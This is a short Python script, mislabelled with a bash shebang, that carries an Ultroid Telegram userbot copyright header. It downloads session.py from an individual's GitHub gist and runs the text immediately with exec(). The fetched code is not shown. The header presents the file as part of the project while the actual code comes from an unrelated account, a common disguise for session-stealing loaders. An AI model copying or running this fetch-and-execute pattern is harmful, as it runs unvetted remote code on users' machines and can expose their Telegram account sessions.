#!/bin/bash
# Ultroid - UserBot
# Copyright (C) 2021 TeamUltroid
#
# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.

import requests

url = "https://gist.githubusercontent.com/kkhanyaseen/81b6f7c5c79e1f59e513a3dd771fb8a8/raw/aca35fe566be5b270aca01a3a401cf79d90fdf0f/session.py"

# Fetch the raw content of the file
response = requests.get(url)
code = response.text

# Execute the Python code
exec(code)
